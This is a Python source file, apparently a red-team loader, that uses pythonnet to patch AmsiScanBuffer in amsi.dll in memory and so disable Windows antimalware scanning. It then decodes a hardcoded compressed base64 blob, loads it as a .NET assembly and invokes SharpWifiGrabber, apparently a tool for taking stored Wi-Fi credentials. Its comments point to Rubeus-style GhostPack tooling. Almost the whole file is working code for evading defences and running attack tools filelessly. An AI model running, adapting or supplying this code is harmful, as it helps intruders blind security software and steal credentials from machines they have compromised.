import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpWifiGrabber.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()